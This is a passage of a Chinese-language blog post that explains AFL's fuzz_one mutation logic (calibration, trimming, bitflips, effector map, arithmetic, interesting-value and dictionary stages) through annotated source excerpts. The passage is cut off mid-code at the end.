O_RDONLY);</span><br><span class="line">orig_in = in_buf = <span class="built_in">mmap</span>(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line">out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br></pre></td></tr></table></figure><p>将测试用例映射到内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line">    u8 res = FAULT_TMOUT;</span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line">        queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line">        res = <span class="built_in">calibrate_case</span>(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">        cur_skipped_paths++;</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新校准之前失败的测试用例，确保测试用例能正常运行，超过重试次数就直接放弃</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line">    u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">        cur_skipped_paths++;</span><br><span class="line">        <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修剪测试用例，移除不影响执行路径的冗余字节，减少文件大小，提高变异效率，每个测试用例只修剪一次</p><blockquote><p>trim_case函数之后分析</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳过确定性变异的条件</span></span><br><span class="line"><span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分布式模糊测试中的分工</span></span><br><span class="line"><span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br></pre></td></tr></table></figure><p>计算修剪之后的性能，直接到havoc变异的条件判断</p><h3 id="确定性变异"><a href="#确定性变异" class="headerlink" title="确定性变异"></a>确定性变异</h3><h4 id="位翻转"><a href="#位翻转" class="headerlink" title="位翻转"></a>位翻转</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span></span><br><span class="line"><span class="meta">    u8* _arf = (u8*)(_ar); \</span></span><br><span class="line"><span class="meta">    u32 _bf = (_b); \</span></span><br><span class="line"><span class="meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure><p>精确翻转任意位置的单个位（<code>_ar</code>是字符串指针，<code>_b</code>是要翻转的位）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stage_name = <span class="string">&quot;bitflip 1/1&quot;</span>;</span><br><span class="line">stage_max = len &lt;&lt; <span class="number">3</span>;  <span class="comment">// 总位数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);  <span class="comment">// 恢复</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自动字典构建逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line">        u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">        <span class="comment">// ... 检测魔术字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会对该测试用例的每一个位都进行翻转，然后调用<code>common_fuzz_stuff</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST u8 <span class="title">common_fuzz_stuff</span><span class="params">(<span class="type">char</span>** argv, u8* out_buf, u32 len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fault;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (post_handler) &#123;</span><br><span class="line"></span><br><span class="line">    out_buf = <span class="built_in">post_handler</span>(out_buf, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_to_testcase</span>(out_buf, len);</span><br><span class="line"></span><br><span class="line">  fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Users can hit us with SIGUSR1 to request the current input</span></span><br><span class="line"><span class="comment">     to be abandoned. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_requested) &#123;</span><br><span class="line"></span><br><span class="line">     skip_requested = <span class="number">0</span>;</span><br><span class="line">     cur_skipped_paths++;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This handles FAULT_ERROR for us: */</span></span><br><span class="line"></span><br><span class="line">  queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，然后保存有趣的测试用例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br></pre></td></tr></table></figure><ul><li><p>检查执行结果是否发现了新的代码路径或崩溃</p></li><li><p>如果有价值，将测试用例保存到队列中供后续分析</p></li><li><p>更新发现的队列项目计数</p></li></ul><p>运行完这个函数如果超时多次或者跳过就会直接放弃这次fuzz</p><p>之后就是一样的多次翻转</p><h4 id="自动字典构建逻辑"><a href="#自动字典构建逻辑" class="headerlink" title="自动字典构建逻辑"></a>自动字典构建逻辑</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; (stage_cur &amp; <span class="number">7</span>) == <span class="number">7</span>) &#123;</span><br><span class="line"></span><br><span class="line">  u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If at end of file and we are still collecting a string, grab the</span></span><br><span class="line"><span class="comment">       final character and force output. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">    a_len++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">       worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">    a_len = <span class="number">0</span>;</span><br><span class="line">    prev_cksum = cksum;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不在dumb模式下且只在每个字节的<strong>最低位</strong>翻转时检查（stage_cur &amp; 7 &#x3D;&#x3D; 7）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br></pre></td></tr></table></figure><p>计算当前程序执行路径的哈希值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stage_cur == stage_max - <span class="number">1</span> &amp;&amp; cksum == prev_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">    a_len++;</span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当到达文件末尾且仍在收集字符串，且长度在3个字节到32个字节之间，直接添加进字典</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">        <span class="built_in">maybe_add_auto</span>(a_collect, a_len);</span><br><span class="line">    a_len = <span class="number">0</span>;</span><br><span class="line">    prev_cksum = cksum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径哈希发生变化，说明找到了一个完整的语法标识，加入字典</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];        </span><br><span class="line">    a_len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当位翻转真正产生差异时才收集字符</p><h4 id="多位翻转"><a href="#多位翻转" class="headerlink" title="多位翻转"></a>多位翻转</h4><ul><li><p>bitflip 2&#x2F;1: 连续翻转2位</p></li><li><p>bitflip 4&#x2F;1: 连续翻转4位</p></li><li><p>bitflip 8&#x2F;8: 整字节翻转（构建效应器映射）</p></li><li><p>bitflip 16&#x2F;8: 连续2字节翻转</p></li><li><p>bitflip 32&#x2F;8: 连续4字节翻转</p></li></ul><p>其中在8&#x2F;8的整字节翻转中有 AFL 中 重要的 Effective Map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)]) &#123;</span><br><span class="line"></span><br><span class="line">  u32 cksum;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If in dumb mode or if the file is very short, just flag everything</span></span><br><span class="line"><span class="comment">     without wasting time on checksums. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)</span><br><span class="line">    cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cksum = ~queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">    eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)] = <span class="number">1</span>;</span><br><span class="line">    eff_cnt++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在个eff_map中，如果该字节整个翻转不会造成程序的执行路径的改变，则将其标记，在之后的确定性变异中直接跳过该字节</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_APOS(_p)          ((_p) &gt;&gt; EFF_MAP_SCALE2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_REM(_x)           ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_ALEN(_l)          (EFF_APOS(_l) + !!EFF_REM(_l))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)</span></span><br></pre></td></tr></table></figure><p>为了节省内存，每8个连续字节共享一个映射位，这意味着如果8字节块中任何一个字节有效，整个块都被标记为有效</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (eff_cnt != <span class="built_in">EFF_ALEN</span>(len) &amp;&amp; </span><br><span class="line">    eff_cnt * <span class="number">100</span> / <span class="built_in">EFF_ALEN</span>(len) &gt; EFF_MAX_PERC) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(eff_map, <span class="number">1</span>, <span class="built_in">EFF_ALEN</span>(len));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有效字节密度超过90%，则标记全部都是有效的</p><h4 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u8 orig = out_buf[i];</span><br><span class="line">    <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;  <span class="comment">// 跳过无效字节</span></span><br><span class="line">        stage_max -= <span class="number">2</span> * ARITH_MAX;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line">        <span class="comment">// 加法变异</span></span><br><span class="line">        u8 r = orig ^ (orig + j);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;  <span class="comment">// 避免重复</span></span><br><span class="line">            out_buf[i] = orig + j;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 减法变异</span></span><br><span class="line">        r = orig ^ (orig - j);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;</span><br><span class="line">            out_buf[i] = orig - j;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    out_buf[i] = orig;  <span class="comment">// 恢复原值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">could_be_bitflip</span><span class="params">(u32 xor_val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 sh = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!xor_val) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Shift left until first bit set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!(xor_val &amp; <span class="number">1</span>)) &#123; sh++; xor_val &gt;&gt;= <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1-, 2-, and 4-bit patterns are OK anywhere. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">1</span> || xor_val == <span class="number">3</span> || xor_val == <span class="number">15</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 8-, 16-, and 32-bit patterns are OK only if shift factor is</span></span><br><span class="line"><span class="comment">     divisible by 8, since that&#x27;s the stepover for these ops. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sh &amp; <span class="number">7</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xor_val == <span class="number">0xff</span> || xor_val == <span class="number">0xffff</span> || xor_val == <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否是位翻转后的结果，避免重复fuzz</p><p>就是对每一个位进行加减法的变异</p><p>之后就是16和32位的加减法变异</p><h4 id="有趣值变异"><a href="#有趣值变异" class="headerlink" title="有趣值变异"></a>有趣值变异</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8位有趣值</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    u8 orig = out_buf[i];</span><br><span class="line">    <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;</span><br><span class="line">        stage_max -= <span class="built_in">sizeof</span>(interesting_8);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">sizeof</span>(interesting_8); j++) &#123;</span><br><span class="line">        <span class="comment">// 避免与之前变异重复</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">could_be_bitflip</span>(orig ^ (u8)interesting_8[j]) ||</span><br><span class="line">            <span class="built_in">could_be_arith</span>(orig, (u8)interesting_8[j], <span class="number">1</span>)) &#123;</span><br><span class="line">            stage_max--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        out_buf[i] = interesting_8[j];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">        out_buf[i] = orig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有趣值包括：</p><ul><li><p>8位：-128, -1, 0, 1, 16, 32, 64, 100, 127</p></li><li><p>16位：-32768, -129, 128, 255, 256, 512, 1000, 1024, 4096, 32767</p></li><li><p>32位：边界值和常用的大整数</p></li></ul><h4 id="字典变异"><a href="#字典变异" class="headerlink" title="字典变异"></a>字典变异</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">extra_data</span> &#123;</span><br><span class="line">  u8* data;        <span class="comment">/* 字典token数据 */</span></span><br><span class="line">  u32 len;         <span class="comment">/* 字典token长度 */</span></span><br><span class="line">  u32 hit_cnt;     <span class="comment">/* 在语料库中的使用计数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>字典条目结构体</p><p>相关变量和常量：</p><ul><li><p><code>extras[]</code>: 用户提供的字典条目数组</p></li><li><p><code>extras_cnt</code>: 用户字典条目总数</p></li><li><p><code>a_extras[]</code>: 自动提取的字典条目数组</p></li><li><p><code>a_extras_cnt</code>: 自动字典条目总数</p></li><li><p><code>MAX_DICT_FILE = 128</code>: 单个字典token最大长度</p></li><li><p><code>MAX_DET_EXTRAS = 200</code>: 确定性步骤中使用的用户字典token最大数量</p></li><li><p><code>USE_AUTO_EXTRAS = 50</code>: 实际用于模糊测试的自动字典token数量</p></li><li><p><code>MAX_AUTO_EXTRAS = 500</code>: 内存中保存的自动字典token候选数量</p></li></ul><h5 id="覆盖变异"><a href="#覆盖变异" class="headerlink" title="覆盖变异"></a>覆盖变异</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">stage_max = extras_cnt * len;  <span class="comment">// 总变异次数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;           <span class="comment">// 遍历输入文件每个位置</span></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;  <span class="comment">// 遍历每个字典token</span></span><br><span class="line">    <span class="comment">// 跳过条件检查</span></span><br><span class="line">    <span 